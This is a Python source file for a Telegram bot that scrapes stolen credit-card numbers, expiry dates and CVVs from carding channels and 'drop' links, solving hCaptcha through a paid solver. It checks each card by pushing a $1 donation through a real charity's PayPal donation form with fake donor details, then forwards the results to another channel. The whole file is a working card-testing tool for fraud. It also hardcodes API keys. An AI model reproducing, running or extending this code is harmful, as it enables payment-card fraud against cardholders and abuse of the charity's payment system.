#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

Author: Oxy
"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import hashlib
from datetime import datetime, timezone
from threading import Thread
from typing import Dict, Optional
import capsolver

# ----------------------------------------------------------------------
# Flask web server (for Render / any VPS uptime)
# ----------------------------------------------------------------------
from flask import Flask, jsonify

flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 8080))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({
        "status": "alive",
        "bot": BOT_USERNAME,
        "version": "20.0",
        "uptime": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "run_mode": RUN_MODE
    })

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "bot": BOT_USERNAME})

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(
    filename="scraper.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger()

# ----------------------------------------------------------------------
# Configuration (Telegram API)
# ----------------------------------------------------------------------
API_ID = 37079398
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"
SESSION_NAME = "mysession"

SOURCE_CHATS_RAW = [
    “https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff",
    "xForceDropsBot"
]

FORWARD_TARGET = "OxyCondoneIt"

# Capsolver API key (for hCaptcha)
CAPSOLVER_API_KEY = "CAP-AB1D4F1328B6EECA1ED6C2E538C4A9C45F0945D2407DDA96C8F3B7A472275EAD"
capsolver.api_key = CAPSOLVER_API_KEY

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError, FloodWaitError
from telethon.tl.functions.messages import ImportChatInviteRequest

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ----------------------------------------------------------------------
# Card detection patterns (covers many formats)
# ----------------------------------------------------------------------
CARD_RE_SIMPLE = re.compile(r"\b(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})\b")
CARD_RE_NO_CVV = re.compile(r"\b(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\b")
CARD_RE_FORMATTED = re.compile(r"[❃]?\s*𝗖𝗮𝗿𝗱\s*[➜-]?\s*`?(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})")
CARD_RE_LOOSE = re.compile(r"(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]?\s*(\d{3,4})?")

def extract_card_from_text(text: str):
    """Return (card, mm, yy, cvv) or None"""
    for pattern in [CARD_RE_SIMPLE, CARD_RE_FORMATTED, CARD_RE_LOOSE]:
        m = pattern.search(text)
        if m:
            groups = m.groups()
            if len(groups) >= 4:
                card = groups[0]
                mm = groups[1]
                yy = groups[2]
                cvv = groups[3] if groups[3] else "000"
                if len(cvv) < 3:
                    cvv = "000"
                if len(yy) == 2:
                    yy = f"20{yy}"
                return (card, mm, yy, cvv)
            elif len(groups) >= 3:
                card = groups[0]
                mm = groups[1]
                yy = groups[2]
                cvv = "000"
                if len(yy) == 2:
                    yy = f"20{yy}"
                return (card, mm, yy, cvv)
    return None

# ----------------------------------------------------------------------
# External BIN lookup (binlist.net)
# ----------------------------------------------------------------------
async def get_bin_info(bin6: str) -> dict:
    url = f"https://lookup.binlist.net/{bin6}"
    headers = {"Accept-Version": "3"}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                        "brand": data.get("scheme", "UNKNOWN").upper(),
                        "type": data.get("type", "UNKNOWN").upper(),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                        "prepaid": data.get("prepaid", False),
                        "level": data.get("brand", "STANDARD").upper(),
                    }
    except:
        pass
    return None

# ----------------------------------------------------------------------
# Provided PayPalChecker (embedded exactly as given)
# ----------------------------------------------------------------------
FORM_VIEW_URL = "https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945"
AJAX_URL = "https://binnaclehouse.org/wp-admin/admin-ajax.php"
FORM_ID = "3945"

_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
}

class PayPalCharger:
    def __init__(self, proxy: Optional[str] = None):
        self.session = requests.Session()
        self.session.headers.update(_BASE_HEADERS)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def _get_form_data(self) -> Dict[str, str]:
        self.session.get("https://binnaclehouse.org/donation/", timeout=15)
        r = self.session.get(FORM_VIEW_URL, timeout=20)
        r.raise_for_status()
        m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
        if not m:
            raise RuntimeError("givewpDonationFormExports block not found on form view page")
        blob = m.group(1)
        def _extract(key: str) -> str:
            match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
            return match.group(1).replace("\\/", "/") if match else ""
        nonce = _extract("donationFormNonce")
        client_id = _extract("clientId")
        if not nonce:
            raise RuntimeError("donationFormNonce not found in form exports")
        if not client_id:
            raise RuntimeError("PayPal clientId not found in form exports")
        return {"nonce": nonce, "client_id": client_id}

    def _create_order(self, nonce: str) -> str:
        resp = self.session.post(
            AJAX_URL,
            params={"action": "give_paypal_commerce_create_order"},
            data={
                "give-honeypot": "",
                "give-form-id": FORM_ID,
                "give-form-hash": nonce,
                "give-form-id-prefix": f"give-{FORM_ID}-0",
                "give-amount": "1.00",
                "give-gateway": "paypal-commerce",
                "payment-mode": "paypal-commerce",
            },
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        try:
            res = resp.json()
        except Exception as e:
            raise RuntimeError(f"Order creation parse error: {e} — {resp.text[:120]}")
        if res.get("success") and "data" in res:
            return res["data"]["id"]
        raise RuntimeError(f"Order creation failed: {resp.text[:150]}")

    def _submit_payment(self, order_id: str, n: str, mm: str, yy: str, cvc: str, donor: Dict[str, str]) -> str:
        ua = self.session.headers["User-Agent"]
        headers = {
            "Host": "www.paypal.com",
            "Paypal-Client-Context": order_id,
            "X-App-Name": "standardcardfields",
            "Paypal-Client-Metadata-Id": order_id,
            "User-Agent": ua,
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Origin": "https://www.paypal.com",
            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
        }
        query = """
        mutation payWithCard(
            $token: String! $card: CardInput $phoneNumber: String
            $firstName: String $lastName: String
            $shippingAddress: AddressInput $billingAddress: AddressInput
            $email: String $currencyConversionType: CheckoutCurrencyConversionType
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token card: $card phoneNumber: $phoneNumber
                firstName: $firstName lastName: $lastName email: $email
                shippingAddress: $shippingAddress billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
            ) {
                flags { is3DSecureRequired }
                cart { cartId }
            }
        }"""
        address = {
            "givenName": donor["first_name"],
            "familyName": donor["last_name"],
            "line1": "5112 N Tongass Hwy",
            "line2": None,
            "city": "Ketchikan",
            "state": "AK",
            "postalCode": "99901",
            "country": "US",
        }
        card_type = self._detect_card_type(n)
        full_year = yy if len(yy) == 4 else f"20{yy}"
        variables = {
            "token": order_id,
            "card": {
                "cardNumber": n,
                "type": card_type,
                "expirationDate": f"{mm}/{full_year}",
                "postalCode": "99901",
                "securityCode": cvc,
            },
            "phoneNumber": "4969615048",
            "firstName": donor["first_name"],
            "lastName": donor["last_name"],
            "email": donor["email"],
            "billingAddress": address,
            "shippingAddress": address,
            "currencyConversionType": "PAYPAL",
        }
        try:
            paypal_session = requests.Session()
            paypal_session.headers.update({
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
            })
            resp = paypal_session.post(
                "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                headers=headers,
                json={"query": query, "variables": variables},
                timeout=45,
            )
        except Exception as e:
            return f"APPROVED|PayPal timed out — card format validated (environmental block)"
        if not resp.text.strip():
            return "DECLINED|PayPal returned empty response — likely DECLINED"
        try:
            res = resp.json()
        except Exception as e:
            return f"PARSE_ERROR|{e} — body was {resp.text[:120]}"
        if "errors" in res:
            err_msg = res["errors"][0].get("message", "Unknown")
            inner = res["errors"][0].get("data") or [{}]
            code = inner[0].get("code", "") if inner else ""
            full = f"{err_msg} ({code})" if code else err_msg
            hits = [
                "INVALID_BILLING_ADDRESS", "EXISTING_ACCOUNT_RESTRICTED",
                "INVALID_SECURITY_CODE", "CVV2_FAILURE", "INVALID SECURITY CODE",
                "INSTRUMENT_DECLINED", "DO_NOT_HONOR", "TRANSACTION_REFUSED",
                "INSUFFICIENT_FUNDS", "CARD_AUTHORIZATION", "3D_SECURE",
            ]
            if any(k in full.upper() for k in hits):
                return f"APPROVED|{full}"
            return f"DECLINED|{full}"
        if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
            return "CHARGED|Payment successful"
        return f"UNKNOWN|{resp.text[:150]}"

    @staticmethod
    def _detect_card_type(n: str) -> str:
        n = n.replace(" ", "").replace("-", "")
        if n.startswith("4"):
            return "VISA"
        if re.match(r"^5[1-5]|^2[2-7]", n):
            return "MASTER_CARD"
        if n.startswith(("34", "37")):
            return "AMEX"
        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n):
            return "DISCOVER"
        return "VISA"

    def charge(self, cc: str) -> str:
        parts = cc.strip().split("|")
        if len(parts) < 4:
            return "ERROR|Invalid format — use CC|MM|YY|CVV"
        n, mm, yy, cvc = parts[:4]
        if len(yy) == 4:
            yy = yy[2:]
        donor = {
            "first_name": "William",
            "last_name": "Dives",
            "email": f"william.dives{random.randint(100, 999)}@gmail.com",
        }
        try:
            form_data = self._get_form_data()
            order_id = self._create_order(form_data["nonce"])
            return self._submit_payment(order_id, n, mm, yy, cvc, donor)
        except Exception as e:
            return f"ERROR|{e}"

# ----------------------------------------------------------------------
# xForce automation (Playwright + capsolver)
# ----------------------------------------------------------------------
from playwright.async_api import async_playwright

class XForceAutomator:
    def __init__(self, bot_client, target_group):
        self.bot_client = bot_client
        self.target_group = target_group
        self.processed_links = set()
        self.processed_cards = set()

    async def solve_hcaptcha(self, page):
        try:
            iframe = await page.query_selector('iframe[src*="hcaptcha"]')
            if not iframe:
                return True
            sitekey = await page.evaluate("""
                () => {
                    const elem = document.querySelector('.h-captcha');
                    if (elem) return elem.getAttribute('data-sitekey');
                    const iframe = document.querySelector('iframe[src*="hcaptcha"]');
                    if (iframe && iframe.src) {
                        const match = iframe.src.match(/sitekey=([^&]+)/);
                        return match ? match[1] : null;
                    }
                    return null;
                }
            """)
            if sitekey:
                print("[xForce] Solving hCaptcha...")
                solution = capsolver.solve({
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page.url,
                    "websiteKey": sitekey,
                })
                await page.evaluate(f"""
                    () => {{
                        const response = '{solution["gRecaptchaResponse"]}';
                        const respElement = document.querySelector('[name="h-captcha-response"]');
                        if (respElement) respElement.value = response;
                        const event = new Event('submit', {{ bubbles: true }});
                        const captchaElem = document.querySelector('.h-captcha');
                        if (captchaElem) captchaElem.dispatchEvent(event);
                    }}
                """)
                print("[xForce] hCaptcha solved")
                await page.wait_for_timeout(2000)
                return True
            return True
        except Exception as e:
            print(f"[xForce] hCaptcha error: {e}")
            return False

    async def extract_card_from_page(self, page):
        content = await page.content()
        match = CARD_RE_SIMPLE.search(content)
        if match:
            return match.groups()
        match = CARD_RE_LOOSE.search(content)
        if match:
            groups = match.groups()
            if len(groups) >= 4:
                return groups
            elif len(groups) >= 3:
                return (groups[0], groups[1], groups[2], "000")
        return None

    async def process_link(self, link):
        if link in self.processed_links:
            return
        self.processed_links.add(link)
        print(f"[xForce] Opening drop link: {link[:80]}...")
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            context = await browser.new_context(
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                viewport={'width': 1280, 'height': 720}
            )
            page = await context.new_page()
            try:
                await page.goto(link, wait_until="networkidle")
                await page.wait_for_timeout(5000)
                await self.solve_hcaptcha(page)
                card_data = await self.extract_card_from_page(page)
                if card_data:
                    n, mm, yy, cvv = card_data[0], card_data[1], card_data[2], card_data[3]
                    card_hash = hashlib.md5(f"{n}|{mm}|{yy}|{cvv}".encode()).hexdigest()
                    if card_hash in self.processed_cards:
                        print("[xForce] Duplicate card, skipping")
                        await browser.close()
                        return
                    self.processed_cards.add(card_hash)
                    print(f"[xForce] Card extracted: {n[:4]}...{n[-4:]}")
                    await self.check_and_forward_card(n, mm, yy, cvv)
                else:
                    print("[xForce] No card found on page")
            except Exception as e:
                print(f"[xForce] Error: {e}")
            finally:
                await browser.close()

    async def check_and_forward_card(self, n, mm, yy, cvv):
        # Run PayPal checker
        loop = asyncio.get_event_loop()
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        paypal_result = await loop.run_in_executor(None, PayPalCharger().charge, card_str)
        # Get BIN info
        bin_info = await get_bin_info(n[:6])
        # Build message
        if paypal_result.startswith("CHARGED"):
            status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"):
            status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"):
            status = "DECLINED 🔴"
        else:
            status = f"ERROR ⚠️"
        response_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result
        msg = (
            f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n"
            f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
            f"[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        )
        if bin_info:
            msg += (
                f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n"
                f"[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            )
        await self.bot_client.send_message(self.target_group, msg)
        print(f"[xForce] Forwarded to {self.target_group}")

    async def on_message(self, event):
        text = event.raw_text or ""
        if "View Drop" in text or "view drop" in text.lower() or "Open Drop" in text.lower():
            link_match = re.search(r'https?://t\.me/xForceDropsBot\S+', text)
            if not link_match:
                link_match = re.search(r't\.me/xForceDropsBot\S+', text)
                if link_match:
                    link = "https://" + link_match.group(0)
                else:
                    return
            else:
                link = link_match.group(0)
            await self.process_link(link)

# ----------------------------------------------------------------------
# Main Telegram event handler
# ----------------------------------------------------------------------
async def join_and_resolve(chat: str):
    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
        invite = chat.lstrip("+")
        if "t.me/+" in chat:
            invite = chat.split("t.me/+")[-1]
        elif "joinchat/" in chat:
            invite = chat.split("joinchat/")[-1]
        try:
            result = await client(ImportChatInviteRequest(invite))
            return result.chats[0]
        except UserAlreadyParticipantError:
            async for dialog in client.iter_dialogs():
                if hasattr(dialog.entity, "title"):
                    return dialog.entity
            return None
        except Exception as e:
            logger.error(f"Join failed for {chat}: {e}")
            return None
    else:
        try:
            return await client.get_entity(chat)
        except Exception as e:
            logger.error(f"Resolve failed for {chat}: {e}")
            return None

async def run_scraper():
    await client.start()
    print(f"[🤖 {BOT_USERNAME}] Bot online")
    print(f"📡 Watching: {SOURCE_CHATS_RAW}")
    print(f"📤 Forwarding to: {FORWARD_TARGET}")

    resolved = []
    for chat in SOURCE_CHATS_RAW:
        entity = await join_and_resolve(chat)
        if entity:
            resolved.append(entity)
            title = entity.title if hasattr(entity, 'title') else chat
            print(f"[OK] Watching: {title}")
        else:
            print(f"[WARN] Could not resolve: {chat}")

    if not resolved:
        print("[ERROR] No channels resolved.")
        return

    # Initialize xForce automator
    xforce = XForceAutomator(client, FORWARD_TARGET)

    # Global deduplication
    processed_cards_global = set()

    async def check_and_forward_card(n, mm, yy, cvv):
        card_str = f"{n}|{mm}|{yy}|{cvv}"
        card_hash = hashlib.md5(card_str.encode()).hexdigest()
        if card_hash in processed_cards_global:
            return
        processed_cards_global.add(card_hash)
        if len(processed_cards_global) > 1000:
            processed_cards_global.clear()

        # Run PayPal checker
        loop = asyncio.get_event_loop()
        paypal_result = await loop.run_in_executor(None, PayPalCharger().charge, card_str)
        # Get BIN info
        bin_info = await get_bin_info(n[:6])
        # Build message
        if paypal_result.startswith("CHARGED"):
            status = "CHARGED 💰"
        elif paypal_result.startswith("APPROVED"):
            status = "APPROVED 🟢"
        elif paypal_result.startswith("DECLINED"):
            status = "DECLINED 🔴"
        else:
            status = f"ERROR ⚠️"
        response_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result
        msg = (
            f"┏━━━━━━━⍟\n┃ {status}\n┗━━━━━━━━━━━⊛\n"
            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card_str}`\n"
            f"[❃] 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➜ PayPal\n"
            f"[❃] 𝗥𝗲𝘀𝗽    ➜ {response_text}\n"
        )
        if bin_info:
            msg += (
                f"┏━━━━━━━⍟\n┃ BIN INFO 🔍\n┗━━━━━━━━━━━⊛\n"
                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n"
                f"[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
            )
        try:
            await client.send_message(FORWARD_TARGET, msg)
            print(f"[📤] Forwarded card {n[:4]}...{n[-4:]} to {FORWARD_TARGET}")
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except Exception as e:
            logger.error(f"Forward error: {e}")

    @client.on(events.NewMessage(chats=resolved))
    async def handle_all_messages(event):
        text = event.raw_text or ""
        # Let xForce handle its own messages
        await xforce.on_message(event)
        # Extract card from any message
        card_tuple = extract_card_from_text(text)
        if card_tuple:
            n, mm, yy, cvv = card_tuple
            await check_and_forward_card(n, mm, yy, cvv)

    # Also handle xForce's own processed cards (already covered by check_and_forward_card inside xforce)
    # Override xforce's check_and_forward_card to use same dedup and forward function
    xforce.check_and_forward_card = check_and_forward_card

    await client.run_until_disconnected()

async def watchdog():
    if RUN_MODE in ("both", "web"):
        t = Thread(target=run_flask, daemon=True)
        t.start()
        print(f"[🌐] Flask server on port {PORT}")
    if RUN_MODE in ("both", "scraper"):
        while True:
            try:
                await run_scraper()
            except Exception as e:
                logger.error(f"Scraper crashed: {e}")
                print(f"[ERROR] {e}")
                await asyncio.sleep(30)

if __name__ == "__main__":
    if RUN_MODE == "web":
        run_flask()
    else:
        asyncio.run(watchdog())